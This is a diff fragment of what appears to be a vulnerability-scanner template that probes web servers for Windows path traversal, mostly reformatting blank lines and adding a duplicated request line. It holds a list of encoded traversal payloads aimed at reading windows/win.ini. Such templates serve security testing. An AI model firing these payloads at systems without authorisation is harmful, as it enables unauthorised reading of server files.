@@ -13,7 +13,6 @@ info:
   metadata:
     max-request: 23
   tags: azure,windows,lfi,generic
-
 flow: http(1) && http(2)
 
 http:
@@ -31,9 +30,11 @@ http:
         internal: true
 
   - method: GET
+
   - method: GET
     path:
       - "{{BaseURL}}{{paths}}"
+
     payloads:
       paths:
         - "/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini"
@@ -58,7 +59,6 @@ http:
         - "/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini"
         - "/../../../../../../../../../windows/win.ini"
         - "/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
-
     stop-at-first-match: true
     matchers:
       - type: word
